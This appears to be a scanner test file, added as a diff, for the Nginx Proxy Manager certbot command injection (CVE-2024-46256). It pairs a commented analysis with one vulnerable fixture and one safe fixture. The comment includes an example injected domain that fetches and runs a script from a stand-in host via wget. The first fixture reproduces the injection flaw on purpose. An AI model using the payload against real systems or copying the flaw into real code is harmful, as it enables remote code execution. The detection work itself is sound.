@@ -1,0 +1,208 @@
+# Rank 1443 / CVE-2024-46256 (NginxProxyManager/nginx-proxy-manager, CWE-78):
+# Nginx Proxy Manager is a Node/Express UI in front of nginx and certbot. When a
+# user asks it for a Let's Encrypt certificate, `backend/internal/certificate.js`
+# builds the certbot invocation as one flat string and hands it to
+# `utils.exec`, which is `child_process.exec` -- i.e. `/bin/sh -c <string>`:
+#
+#   const cmd = certbotCommand + ' certonly ' +
+#     '--config "' + letsencryptConfig + '" ' +
+#     ...
+#     '--email "' + certificate.meta.letsencrypt_email + '" ' +
+#     '--preferred-challenges "dns,http" ' +
+#     '--domains "' + certificate.domain_names.join(',') + '" ' +
+#     (letsencryptStaging ? '--staging' : '');
+#   return utils.exec(cmd);
+#
+# `certificate.domain_names` is the request body's `domain_names` array, carried
+# through `POST /api/nginx/certificates` and the certificate row. The weakness in
+# one sentence: an attacker-chosen array element is interpolated inside a
+# double-quoted argument of a string that a shell then reparses, so a domain of
+# the form `a.com" ; wget http://evil/x -O /tmp/x; sh /tmp/x #` closes the quote
+# and runs whatever it likes as the container's root user. The same shape is
+# repeated in `requestLetsEncryptSslWithDnsChallenge`, where the DNS-plugin
+# branch builds `mainCmd` the same way and awaits `utils.exec(mainCmd)`.
+#
+# Pool-row correction. The row's commit
+# `e677bfa2e871839a5d86e6312d67c613476249ff` is the **v2.12.0 release merge** --
+# `Merge pull request #4073 from NginxProxyManager/develop`, 48 commits, a
+# `.version` bump, a Jenkinsfile rewrite and a 1456-line swagger deletion. The
+# real fix is one of the commits it carries,
+# `c39d5433bcd13993def222bbb2b6988bbb810a05`, whose message is literally
+# "Fix CVE-2024-46256 and CVE-2024-46257". This is the release-merge variant of
+# pool failure mode 2, and the metadata flag `commit?` is right to be
+# suspicious.
+#
+# What that fix does, and why it leaves the JavaScript untouched. It is a schema
+# change: `backend/schema/common.json` tightens the `domain_names` item pattern
+# from `^(?:\*\.)?(?:[^.*]+\.?)+[^.]$` -- which happily accepts a quote, a
+# semicolon and a space -- to the shell-metacharacter denylist
+# `^[^&| @!#%^();:/\\}{=+?<>,~`'"]+$`, and the API routes reject the request
+# before `internalCertificate.create` is reached. Nothing under `backend/*.js`
+# is modified by the commit at all: the eighteen other files it touches are
+# OpenAPI response schemas, a new `components/error.json`, cypress fixtures and
+# the integration test that replays the advisory's PoC. So the remediation is
+# present at `<fix>` and the vulnerable construct is present at `<fix>^`, but
+# **there is no JavaScript-level difference between the two revisions** -- the
+# concatenation into `child_process.exec` is byte-identical on both sides.
+#
+# Existing coverage, measured. `timeout 180 ./bin/vyql scan --cache off
+# --max-ram 6GB backend/` reports 169 findings, 104 at or above high, on both
+# revisions, identical across three `--cache off` runs of each. Twelve of them
+# are CRITICAL `VYQL-INJ-002`, and two are exactly this CVE:
+#
+#   source: code.DomInput @ internal/certificate.js:230  <- javascript.input@resolved
+#   sink:   code.CommandExecution @ internal/certificate.js:844  <- javascript.sinks@resolved
+#   sink:   code.CommandExecution @ internal/certificate.js:903  <- javascript.sinks@resolved
+#
+# 844 is the `return utils.exec(cmd)` of `requestLetsEncryptSsl` and 903 the
+# `await utils.exec(mainCmd)` of `requestLetsEncryptSslWithDnsChallenge` -- the
+# two certbot invocations that carry `--domains "<user input>"`. The path runs
+# through `requestLetsEncryptSsl#param#certificate` into the `Format` nodes of
+# the concatenation, and both `unless` clauses miss: no `core.ShellEscape`
+# anywhere on the flows, no `core.CommandArgumentValidation` on the sink. So the
+# weakness is judged, at the right severity and on the right lines, and
+# this rank is coverage rather than a gap.
+#
+# The counts being equal on the two revisions is the honest reading of a fix
+# that lives in a JSON schema three layers upstream of the sink, not a miss: the
+# scanner sees the same shell concatenation on both sides because the same shell
+# concatenation is there on both sides.
+#
+# Two things measured while deciding what the `reject` case should be, since the
+# fix supplies no patched JavaScript to copy.
+#
+#   * The repository's own documented alternative works. `backend/lib/utils.js`
+#     exports `execFile`, which is `child_process.execFile(cmd, args)` --
+#     Node's argv form, which spawns the program directly and reparses nothing.
+#     A repro pair differing only in that respect measured 1 CRITICAL
+#     `VYQL-INJ-002` for the concatenated `exec` form and 0 for the argv form,
+#     with the same `req.body` source and the same `--domains` value. That is
+#     the second case below.
+#
+#   * Applying the fixed revision's own denylist in JavaScript does *not* suppress, and
+#     should not. A third repro that runs each domain through
+#     `/^[^&| @!#%^();:\/\\}{=+?<>,~`'"]+$/.test(domain)` and throws before
+#     building the command still reports 1 CRITICAL `VYQL-INJ-002`: a character
+#     denylist on a value that is still interpolated into a shell string is
+#     neither `core.ShellEscape` nor `core.CommandArgumentValidation`, and
+#     teaching a bare `RegExp.test` to clear command-injection taint would trade
+#     a large amount of recall for one project's schema. Recorded here so the
+#     next reader does not re-derive it.
+
+test "rank1443: certbot invocation concatenates request-supplied domain names into a shell command string"
+  lang javascript
+  file backend/internal/certificate.js
+  expect VYQL-INJ-002
+  code
+  ```
+  const express = require('express');
+  const exec    = require('child_process').exec;
+
+  const certbotCommand = 'certbot';
+
+  const utils = {
+    exec: async function (cmd, options = {}) {
+      const { stdout } = await new Promise((resolve, reject) => {
+        const child = exec(cmd, options, (isError, stdout, stderr) => {
+          if (isError) {
+            reject(stderr);
+          } else {
+            resolve({ stdout, stderr });
+          }
+        });
+        child.on('error', (e) => {
+          reject(e);
+        });
+      });
+      return stdout;
+    },
+  };
+
+  const requestLetsEncryptSsl = (certificate) => {
+    const cmd = certbotCommand + ' certonly ' +
+      '--cert-name "npm-' + certificate.id + '" ' +
+      '--agree-tos ' +
+      '--authenticator webroot ' +
+      '--email "' + certificate.meta.letsencrypt_email + '" ' +
+      '--preferred-challenges "dns,http" ' +
+      '--domains "' + certificate.domain_names.join(',') + '" ';
+
+    return utils.exec(cmd);
+  };
+
+  let router = express.Router();
+
+  router.post('/', (req, res, next) => {
+    const certificate = {
+      id:           1,
+      meta:         req.body.meta,
+      domain_names: req.body.domain_names,
+    };
+
+    return requestLetsEncryptSsl(certificate)
+      .then((result) => {
+        res.status(200).send(result);
+      })
+      .catch(next);
+  });
+
+  module.exports = router;
+  ```
+
+test "rank1443: the same certbot invocation passing the domain list as an argv element with no shell"
+  lang javascript
+  file backend/internal/certificate.js
+  reject VYQL-INJ-002
+  code
+  ```
+  const express  = require('express');
+  const execFile = require('child_process').execFile;
+
+  const certbotCommand = 'certbot';
+
+  const utils = {
+    execFile: function (cmd, args) {
+      return new Promise((resolve, reject) => {
+        execFile(cmd, args, function (err, stdout) {
+          if (err && typeof err === 'object') {
+            reject(err);
+          } else {
+            resolve(stdout.trim());
+          }
+        });
+      });
+    },
+  };
+
+  const requestLetsEncryptSsl = (certificate) => {
+    const args = [
+      'certonly',
+      '--cert-name', 'npm-' + certificate.id,
+      '--agree-tos',
+      '--authenticator', 'webroot',
+      '--email', certificate.meta.letsencrypt_email,
+      '--preferred-challenges', 'dns,http',
+      '--domains', certificate.domain_names.join(','),
+    ];
+
+    return utils.execFile(certbotCommand, args);
+  };
+
+  let router = express.Router();
+
+  router.post('/', (req, res, next) => {
+    const certificate = {
+      id:           1,
+      meta:         req.body.meta,
+      domain_names: req.body.domain_names,
+    };
+
+    return requestLetsEncryptSsl(certificate)
+      .then((result) => {
+        res.status(200).send(result);
+      })
+      .catch(next);
+  });
+
+  module.exports = router;
+  ```
